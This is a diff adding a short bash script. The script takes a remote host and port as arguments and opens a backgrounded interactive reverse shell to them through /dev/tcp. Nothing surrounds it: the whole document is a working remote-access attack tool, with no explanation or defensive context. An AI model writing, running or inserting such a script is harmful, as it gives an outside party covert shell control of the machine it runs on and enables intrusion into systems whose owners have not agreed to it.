@@ -1,0 +1,6 @@
+#!/usr/bin/env bash
+
+export RHOST=$1
+export RPORT=$2
+
+bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1 &'
